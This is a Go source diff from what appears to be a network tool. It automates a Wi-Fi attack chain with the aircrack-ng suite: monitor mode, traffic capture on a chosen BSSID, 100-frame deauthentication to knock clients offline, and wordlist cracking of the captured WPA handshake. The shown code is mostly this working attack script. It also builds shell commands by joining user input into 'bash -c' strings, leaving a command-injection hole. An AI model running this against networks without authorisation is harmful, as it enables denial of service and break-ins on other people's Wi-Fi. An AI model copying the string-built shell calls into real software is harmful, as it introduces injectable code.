@@ -682,34 +682,69 @@ func parseNmapOutput(output string) map[string][]string {
 // End of Subnet scanner //
 
 // Network Monitoring //
+
+
+
+func launchTerminal(cmdArgs...string) error {
+	// Join the command arguments
+	command := strings.Join(cmdArgs, " ")
+	// Construct the command to open x-terminal-emulator with airdump-ng
+	cmd := exec.Command("nohup", "x-terminal-emulator", "-e", "bash", "-c", command + "; read -p 'Press Enter to exit'")
+	err := cmd.Start()
+	if err!= nil {
+		fmt.Println("Error starting command:", err)
+		return err
+	}
+	// No need to wait for the command to finish here since it's detached
+	return nil
+}
+
 func startMonitorMode(adapter string) error {
+	// Kill processes that might interfere with the wireless interface
+	// cmdKill := exec.Command("airmon-ng", "check", "kill")
+	// cmdKill.Stdout = os.Stdout
+	// cmdKill.Stderr = os.Stderr
+	// err := cmdKill.Run()
+	// if err!= nil {
+	// 	fmt.Println("Error killing processes:", err)
+	// 	return err
+	// }
+
+	// Start the wireless interface in monitor mode
 	fmt.Println("Starting Monitor mode.")
 	cmd := exec.Command("airmon-ng", "start", adapter)
-	return cmd.Run()
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err := cmd.Run()
+	if err!= nil {
+		fmt.Println("Error starting monitor mode:", err)
+		return err
+	}
+
+	fmt.Println("Monitor mode started successfully.")
+	return nil
 }
 
 func captureTraffic() error {
-	fmt.Println("Opening new terminal window and capturing wireless traffic")
-	cmd := exec.Command("/bin/sh", "-c", "airodump-ng mon0")
-	return cmd.Run()
+    fmt.Println("Opening new terminal window and capturing wireless traffic")
+    // Adjusted to include a continuous monitoring argument
+    return launchTerminal("airodump-ng", "wlan0mon")
 }
+
 
 func scanTarget(BSSID, channel string) error {
 	fmt.Printf("Opening new terminal for target %s\n", BSSID)
-	cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("airodump-ng --bssid %s -c %s --write WPAcrack mon0", BSSID, channel))
-	return cmd.Run()
+	return launchTerminal("airodump-ng --bssid " + BSSID + " -c " + channel + " --write WPAcrack wlan0mon")
 }
 
 func deauthenticateTarget(BSSID string) error {
 	fmt.Println("Turning target offline...")
-	cmd := exec.Command("aireplay-ng", "--deauth", "100", "-a", BSSID, "mon0")
-	return cmd.Run()
+	return launchTerminal("aireplay-ng --deauth 100 -a "+BSSID+" wlan0mon")
 }
 
 func crackWPA(key, wordlistfile string) error {
 	fmt.Printf("Cracking WPA KEY %s\n", key)
-	cmd := exec.Command("aircrack-ng", "-w", wordlistfile, "WPAcrack")
-	return cmd.Run()
+	return launchTerminal("aircrack-ng -w "+wordlistfile+" WPAcrack")
 }
 
 func MonitorMode() {
@@ -724,21 +759,21 @@ func MonitorMode() {
 	}
 
 	if !strings.HasPrefix(adapter, "wlan") {
-		fmt.Println(Red + "Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter." + Reset)
+		fmt.Println("Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter.")
 		return
 	}
 
 	err := startMonitorMode(adapter)
 	if err != nil {
-		fmt.Println(Red + "Failed to enter monitor mode:" + Reset, err)
+		fmt.Println("Failed to enter monitor mode:", err)
 		return
 	}
-	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")
+	fmt.Println("Monitor mode started successfully.")
 
 	// Scanning Wireless Traffic
 	err = captureTraffic()
 	if err != nil {
-		fmt.Println(Red + "Failed to capture wireless traffic:" + Reset, err)
+		fmt.Println("Failed to capture wireless traffic:", err)
 		return
 	}
 
@@ -755,13 +790,13 @@ func MonitorMode() {
 
 	err = scanTarget(BSSID, channel)
 	if err != nil {
-		fmt.Println(Red + "Failed to scan target:" + Reset, err)
+		fmt.Println("Failed to scan target:", err)
 		return
 	}
 
 	err = deauthenticateTarget(BSSID)
 	if err != nil {
-		fmt.Println(Red + "Failed to deauthenticate target:" + Reset, err)
+		fmt.Println("Failed to deauthenticate target:", err)
 		return
 	}
 
@@ -778,7 +813,7 @@ func MonitorMode() {
 
 	err = crackWPA(key, wordlistfile)
 	if err != nil {
-		fmt.Println(Red + "Failed to crack WPA key:" + Reset, err)
+		fmt.Println("Failed to crack WPA key:", err)
 		return
 	}
 }
